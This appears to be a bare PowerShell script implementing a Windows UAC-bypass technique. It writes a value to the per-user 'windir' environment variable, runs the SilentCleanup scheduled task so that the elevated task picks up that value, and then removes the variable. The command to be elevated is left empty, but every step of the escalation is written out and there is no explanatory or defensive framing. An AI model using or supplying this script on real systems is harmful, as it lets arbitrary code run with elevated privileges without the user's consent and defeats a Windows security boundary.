$REG = "HKCU:\Environment"
$NAME = "windir"
$COMMAND = ""
New-ItemProperty -Path $REG -Name $NAME -Value $COMMAND -PropertyType string -Force | out-null
Start-Sleep -s 1
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
Start-Sleep -s 1
Remove-ItemProperty -Path $REG -Name $NAME
